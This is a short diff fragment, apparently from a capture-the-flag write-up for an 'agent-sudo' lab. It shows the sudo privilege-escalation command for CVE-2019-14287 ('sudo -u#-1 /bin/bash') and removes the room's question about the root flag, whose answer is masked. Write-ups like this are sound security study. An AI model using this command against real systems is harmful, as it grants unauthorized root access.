@@ -84,12 +84,3 @@ User james may run the following commands on agent-sudo:
 
 CVE-2019-14287 : - To Get Root access we can try to mention a user that doesn't exists
 sudo -u#-1 /bin/bash
-
-#2	
-
-What is the root flag?
-
-Answer: ********************************
-#3	
-(Bonus) Who is Agent R?
-
